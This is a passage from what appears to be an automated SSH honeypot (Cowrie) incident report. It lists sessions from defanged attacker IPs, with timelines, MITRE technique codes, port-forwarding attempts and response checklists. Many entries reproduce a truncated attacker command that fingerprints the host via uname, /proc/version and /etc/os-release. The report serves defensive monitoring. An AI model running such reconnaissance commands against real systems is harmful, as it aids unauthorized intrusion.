| `2026-07-25 10:25:55` | `cowrie.log.closed` |
| `2026-07-25 10:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffdd314bd18f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:27 |
| **Last Seen** | 2026-07-25 10:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:27:46` | `cowrie.session.connect` |
| `2026-07-25 10:27:47` | `cowrie.client.version` |
| `2026-07-25 10:27:47` | `cowrie.client.kex` |
| `2026-07-25 10:27:48` | `cowrie.login.success` |
| `2026-07-25 10:27:50` | `cowrie.session.params` |
| `2026-07-25 10:27:50` | `cowrie.command.input` |
| `2026-07-25 10:27:50` | `cowrie.command.input` |
| `2026-07-25 10:27:50` | `cowrie.command.input` |
| `2026-07-25 10:27:50` | `cowrie.command.input` |
| `2026-07-25 10:27:50` | `cowrie.command.input` |
| `2026-07-25 10:27:50` | `cowrie.command.success` |
| `2026-07-25 10:27:50` | `cowrie.command.input` |
| `2026-07-25 10:27:50` | `cowrie.command.input` |
| `2026-07-25 10:27:50` | `cowrie.command.input` |
| `2026-07-25 10:27:50` | `cowrie.command.input` |
| `2026-07-25 10:27:50` | `cowrie.log.closed` |
| `2026-07-25 10:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec7edea89683

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:29 |
| **Last Seen** | 2026-07-25 10:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:29:41` | `cowrie.session.connect` |
| `2026-07-25 10:29:41` | `cowrie.client.version` |
| `2026-07-25 10:29:41` | `cowrie.client.kex` |
| `2026-07-25 10:29:43` | `cowrie.login.success` |
| `2026-07-25 10:29:44` | `cowrie.session.params` |
| `2026-07-25 10:29:44` | `cowrie.command.input` |
| `2026-07-25 10:29:44` | `cowrie.command.input` |
| `2026-07-25 10:29:44` | `cowrie.command.input` |
| `2026-07-25 10:29:44` | `cowrie.command.input` |
| `2026-07-25 10:29:44` | `cowrie.command.input` |
| `2026-07-25 10:29:44` | `cowrie.command.success` |
| `2026-07-25 10:29:44` | `cowrie.command.input` |
| `2026-07-25 10:29:44` | `cowrie.command.input` |
| `2026-07-25 10:29:44` | `cowrie.command.input` |
| `2026-07-25 10:29:44` | `cowrie.command.input` |
| `2026-07-25 10:29:45` | `cowrie.log.closed` |
| `2026-07-25 10:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3058f86ad72

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-25 10:30 |
| **Last Seen** | 2026-07-25 10:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:30:14` | `cowrie.session.connect` |
| `2026-07-25 10:30:14` | `cowrie.client.version` |
| `2026-07-25 10:30:15` | `cowrie.client.kex` |
| `2026-07-25 10:30:15` | `cowrie.login.success` |
| `2026-07-25 10:30:15` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:30:15` | `cowrie.direct-tcpip.data` |
| `2026-07-25 10:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df9d395c8fb5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:31 |
| **Last Seen** | 2026-07-25 10:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:31:31` | `cowrie.session.connect` |
| `2026-07-25 10:31:31` | `cowrie.client.version` |
| `2026-07-25 10:31:31` | `cowrie.client.kex` |
| `2026-07-25 10:31:33` | `cowrie.login.success` |
| `2026-07-25 10:31:34` | `cowrie.session.params` |
| `2026-07-25 10:31:34` | `cowrie.command.input` |
| `2026-07-25 10:31:34` | `cowrie.command.input` |
| `2026-07-25 10:31:34` | `cowrie.command.input` |
| `2026-07-25 10:31:34` | `cowrie.command.input` |
| `2026-07-25 10:31:34` | `cowrie.command.input` |
| `2026-07-25 10:31:34` | `cowrie.command.success` |
| `2026-07-25 10:31:34` | `cowrie.command.input` |
| `2026-07-25 10:31:34` | `cowrie.command.input` |
| `2026-07-25 10:31:34` | `cowrie.command.input` |
| `2026-07-25 10:31:34` | `cowrie.command.input` |
| `2026-07-25 10:31:35` | `cowrie.log.closed` |
| `2026-07-25 10:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8cc963ef032

| Field | Detail |
|---|---|
| **Source IP** | `220.78.182[.]74` |
| **First Seen** | 2026-07-25 10:31 |
| **Last Seen** | 2026-07-25 10:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:31:58` | `cowrie.session.connect` |
| `2026-07-25 10:31:59` | `cowrie.client.version` |
| `2026-07-25 10:31:59` | `cowrie.client.kex` |
| `2026-07-25 10:32:01` | `cowrie.login.success` |
| `2026-07-25 10:32:02` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.78.182[.]74` to AbuseIPDB if not already reported
- [ ] Block `220.78.182[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b188f99a1b15

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]119` |
| **First Seen** | 2026-07-25 10:32 |
| **Last Seen** | 2026-07-25 10:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:32:07` | `cowrie.session.connect` |
| `2026-07-25 10:32:08` | `cowrie.client.version` |
| `2026-07-25 10:32:08` | `cowrie.client.kex` |
| `2026-07-25 10:32:10` | `cowrie.login.success` |
| `2026-07-25 10:32:11` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:32:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c07507d86c3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:33 |
| **Last Seen** | 2026-07-25 10:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:33:19` | `cowrie.session.connect` |
| `2026-07-25 10:33:19` | `cowrie.client.version` |
| `2026-07-25 10:33:19` | `cowrie.client.kex` |
| `2026-07-25 10:33:21` | `cowrie.login.success` |
| `2026-07-25 10:33:22` | `cowrie.session.params` |
| `2026-07-25 10:33:22` | `cowrie.command.input` |
| `2026-07-25 10:33:22` | `cowrie.command.input` |
| `2026-07-25 10:33:22` | `cowrie.command.input` |
| `2026-07-25 10:33:22` | `cowrie.command.input` |
| `2026-07-25 10:33:22` | `cowrie.command.input` |
| `2026-07-25 10:33:22` | `cowrie.command.success` |
| `2026-07-25 10:33:22` | `cowrie.command.input` |
| `2026-07-25 10:33:22` | `cowrie.command.input` |
| `2026-07-25 10:33:22` | `cowrie.command.input` |
| `2026-07-25 10:33:22` | `cowrie.command.input` |
| `2026-07-25 10:33:23` | `cowrie.log.closed` |
| `2026-07-25 10:33:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4427f91ba58

| Field | Detail |
|---|---|
| **Source IP** | `103.67.152[.]201` |
| **First Seen** | 2026-07-25 10:35 |
| **Last Seen** | 2026-07-25 10:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:35:30` | `cowrie.session.connect` |
| `2026-07-25 10:35:30` | `cowrie.client.version` |
| `2026-07-25 10:35:30` | `cowrie.client.kex` |
| `2026-07-25 10:35:33` | `cowrie.login.success` |
| `2026-07-25 10:35:33` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.152[.]201` to AbuseIPDB if not already reported
- [ ] Block `103.67.152[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ecd92f71a85

| Field | Detail |
|---|---|
| **Source IP** | `112.26.101[.]76` |
| **First Seen** | 2026-07-25 10:35 |
| **Last Seen** | 2026-07-25 10:35 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:35:43` | `cowrie.session.connect` |
| `2026-07-25 10:35:44` | `cowrie.client.version` |
| `2026-07-25 10:35:44` | `cowrie.client.kex` |
| `2026-07-25 10:35:47` | `cowrie.login.success` |
| `2026-07-25 10:35:48` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.101[.]76` to AbuseIPDB if not already reported
- [ ] Block `112.26.101[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b19d2e768514

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:36 |
| **Last Seen** | 2026-07-25 10:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:36:53` | `cowrie.session.connect` |
| `2026-07-25 10:36:53` | `cowrie.client.version` |
| `2026-07-25 10:36:53` | `cowrie.client.kex` |
| `2026-07-25 10:36:55` | `cowrie.login.success` |
| `2026-07-25 10:36:56` | `cowrie.session.params` |
| `2026-07-25 10:36:56` | `cowrie.command.input` |
| `2026-07-25 10:36:56` | `cowrie.command.input` |
| `2026-07-25 10:36:56` | `cowrie.command.input` |
| `2026-07-25 10:36:56` | `cowrie.command.input` |
| `2026-07-25 10:36:56` | `cowrie.command.input` |
| `2026-07-25 10:36:56` | `cowrie.command.success` |
| `2026-07-25 10:36:56` | `cowrie.command.input` |
| `2026-07-25 10:36:56` | `cowrie.command.input` |
| `2026-07-25 10:36:56` | `cowrie.command.input` |
| `2026-07-25 10:36:56` | `cowrie.command.input` |
| `2026-07-25 10:36:57` | `cowrie.log.closed` |
| `2026-07-25 10:36:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c41a45f2826

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:38 |
| **Last Seen** | 2026-07-25 10:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:38:39` | `cowrie.session.connect` |
| `2026-07-25 10:38:40` | `cowrie.client.version` |
| `2026-07-25 10:38:40` | `cowrie.client.kex` |
| `2026-07-25 10:38:41` | `cowrie.login.success` |
| `2026-07-25 10:38:43` | `cowrie.session.params` |
| `2026-07-25 10:38:43` | `cowrie.command.input` |
| `2026-07-25 10:38:43` | `cowrie.command.input` |
| `2026-07-25 10:38:43` | `cowrie.command.input` |
| `2026-07-25 10:38:43` | `cowrie.command.input` |
| `2026-07-25 10:38:43` | `cowrie.command.input` |
| `2026-07-25 10:38:43` | `cowrie.command.success` |
| `2026-07-25 10:38:43` | `cowrie.command.input` |
| `2026-07-25 10:38:43` | `cowrie.command.input` |
| `2026-07-25 10:38:43` | `cowrie.command.input` |
| `2026-07-25 10:38:43` | `cowrie.command.input` |
| `2026-07-25 10:38:44` | `cowrie.log.closed` |
| `2026-07-25 10:38:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-491b976a685a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:40 |
| **Last Seen** | 2026-07-25 10:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:40:31` | `cowrie.session.connect` |
| `2026-07-25 10:40:31` | `cowrie.client.version` |
| `2026-07-25 10:40:31` | `cowrie.client.kex` |
| `2026-07-25 10:40:33` | `cowrie.login.success` |
| `2026-07-25 10:40:34` | `cowrie.session.params` |
| `2026-07-25 10:40:34` | `cowrie.command.input` |
| `2026-07-25 10:40:34` | `cowrie.command.input` |
| `2026-07-25 10:40:34` | `cowrie.command.input` |
| `2026-07-25 10:40:34` | `cowrie.command.input` |
| `2026-07-25 10:40:34` | `cowrie.command.input` |
| `2026-07-25 10:40:34` | `cowrie.command.success` |
| `2026-07-25 10:40:34` | `cowrie.command.input` |
| `2026-07-25 10:40:34` | `cowrie.command.input` |
| `2026-07-25 10:40:34` | `cowrie.command.input` |
| `2026-07-25 10:40:34` | `cowrie.command.input` |
| `2026-07-25 10:40:35` | `cowrie.log.closed` |
| `2026-07-25 10:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcbd3b10a8a3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:42 |
| **Last Seen** | 2026-07-25 10:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:42:29` | `cowrie.session.connect` |
| `2026-07-25 10:42:29` | `cowrie.client.version` |
| `2026-07-25 10:42:29` | `cowrie.client.kex` |
| `2026-07-25 10:42:31` | `cowrie.login.success` |
| `2026-07-25 10:42:33` | `cowrie.session.params` |
| `2026-07-25 10:42:33` | `cowrie.command.input` |
| `2026-07-25 10:42:33` | `cowrie.command.input` |
| `2026-07-25 10:42:33` | `cowrie.command.input` |
| `2026-07-25 10:42:33` | `cowrie.command.input` |
| `2026-07-25 10:42:33` | `cowrie.command.input` |
| `2026-07-25 10:42:33` | `cowrie.command.success` |
| `2026-07-25 10:42:33` | `cowrie.command.input` |
| `2026-07-25 10:42:33` | `cowrie.command.input` |
| `2026-07-25 10:42:33` | `cowrie.command.input` |
| `2026-07-25 10:42:33` | `cowrie.command.input` |
| `2026-07-25 10:42:34` | `cowrie.log.closed` |
| `2026-07-25 10:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65f5895156d2

| Field | Detail |
|---|---|
| **Source IP** | `123.129.245[.]249` |
| **First Seen** | 2026-07-25 10:42 |
| **Last Seen** | 2026-07-25 10:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:42:29` | `cowrie.session.connect` |
| `2026-07-25 10:42:30` | `cowrie.client.version` |
| `2026-07-25 10:42:30` | `cowrie.client.kex` |
| `2026-07-25 10:42:32` | `cowrie.login.success` |
| `2026-07-25 10:42:32` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.129.245[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.129.245[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a05c821be4cd

| Field | Detail |
|---|---|
| **Source IP** | `112.196.52[.]107` |
| **First Seen** | 2026-07-25 10:44 |
| **Last Seen** | 2026-07-25 10:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:44:17` | `cowrie.session.connect` |
| `2026-07-25 10:44:18` | `cowrie.client.version` |
| `2026-07-25 10:44:18` | `cowrie.client.kex` |
| `2026-07-25 10:44:20` | `cowrie.login.success` |
| `2026-07-25 10:44:21` | `cowrie.direct-tcpip.request` |
| `2026-07-25 10:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.196.52[.]107` to AbuseIPDB if not already reported
- [ ] Block `112.196.52[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-935b6580a1fb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 10:44 |
| **Last Seen** | 2026-07-25 10:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 10:44:22` | `cowrie.session.connect` |
| `2026-07-25 10:44:22` | `cowrie.client.version` |
| `2026-07-25 10:44:22` | `cowrie.client.kex` |
| `2026-07-25 10:44:24` | `cowrie.login.success` |
